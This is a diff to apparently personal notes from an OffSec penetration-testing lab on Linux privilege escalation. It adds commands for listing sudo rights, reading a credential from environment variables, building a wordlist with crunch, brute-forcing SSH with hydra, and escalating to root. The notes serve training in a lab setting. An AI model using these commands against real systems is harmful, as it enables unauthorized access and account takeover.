@@ -2417,8 +2417,20 @@ Reference
   scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe
   ./unix-privesc-check standard > output.txt
   Look for "World write is set for" in output.txt
-  ```
+ 
 - 18.2.1 Inspecting User Trails
+  - List sudoer capabilities for a given user  
+    `sudo -l`  
+    ```
+     User joe may run the following commands on debian-privesc:
+	    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+    ```
+  - Discover credential and brute force with wordlist  
+    `env` > SCRIPT_CREDENTIALS=lab  
+    `crunch 6 6 -t Lab%%% > wordlist`  
+    `hydra -l eve -P wordlist 192.168.185.214 -t 4 ssh -V` > Lab123  
+    `ssh eve@192.168.185.214` `sudo -i` `whoami`  
+  - 
 - 18.2.2 Inspecting Service Footprints
 
 ## Penetration testing report 
